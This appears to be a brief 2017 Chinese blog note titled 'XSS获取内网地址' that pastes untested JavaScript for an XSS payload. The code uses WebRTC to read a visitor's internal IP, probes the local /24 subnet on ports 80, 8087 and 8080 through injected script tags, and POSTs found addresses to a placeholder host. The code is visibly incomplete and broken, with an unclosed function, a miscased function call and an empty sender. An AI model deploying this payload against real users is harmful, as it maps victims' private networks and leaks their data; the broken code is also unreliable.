Title: XSS获取内网地址
Category: Fun
Date: 2017-5-23
slug: xss-get-ip

<http://cb.drops.wiki/bugs/wooyun-2014-076685.html> 

代码未测试

```
var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
if (RTCPeerConnection) (function(){
	var rtc = new RTCPeerConnection({iceServers:[]});
	if (window.mozRTCPeerConnection){
		rtc.createDataChannel('',{reliable:false});
	};
	rtc.onicecandidate = function(evt){
		if (evt.candidate) grepSDP(evt.candidate.candidate);
	};
	rtc.createOffer(function(offerDesc){
		grepSDP(offerDesc.sdp);
		rtc.setLocalDescription(offerDesc);
	},function(e){console.warn("offer failed", e);});
	var addrs = Object.create(null);
	addrs["0.0.0.0"] = false;
	function updateDisplay(newAddr){
		if(newAddr in addrs) return;
		else addrs[newAddr] = true;
		var displayAddrs = Object.keys(addrs).filter(function(k){return addrs[k];});
		var address = displayAddrs.join("or perhaps") || "n/a";
		sendip(address);
	}
	function grepSDP(sdp){
		var hosts = [];
		sdp.split('\r\n').forEach(function(line){
			if(~line.indexOf("a=candidate")){
				var parts = line.split(' '),
				addr = parts[4],
				type = parts[7];
				if(type === 'host') updateDisplay(addr);
			}else if(~line.indexOf("c=")){
				var parts = line.split(' '),
				addr = parts[2];
				updateDisplay(addr);
			}
		});
	}
})();
function sendip(ipaddress){
	var url = "xxxxx";
}

＝＝＝＝代码貌似不全＝＝＝＝

function ipsend(ip, netport){
	var ipdata = ip+":"+netport;
	var url = "x.x.x.x";
	var xmlhttp1 = new XMLHttpRequest();
	xmlhttp1.open("POST",url,true);
	xmlhttp1.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	xmlhttp1.send("ip==<!--start-->" + ipdata);

function ipCreate(ip){
	var ips = ip.replace(/(\d+\.\d+\.\d+)\.\d+/,'$1.');
	for(var i=1;i<=255;i++){
		ElementCreate(ips+i,"80",i);
		ElementCreate(ips+i,"8087",i);
		ElementCreate(ips+i,"8080",i);
	}
}
function ElementCreate(ip,xport,i){
	var url = "http://"+ip+":"+xport;
	var scriptElement = document.createElement("script");
	scriptElement.src = url;
	scriptElement.setAttribute("onload","ipsend(\'"+ip+"\',\'"+xport+"\')");
	document.body.appendChild(scriptElement);
}
ipcreate("10.10.125.195");
}

=＝＝＝＝代码貌似不全＝＝＝＝








```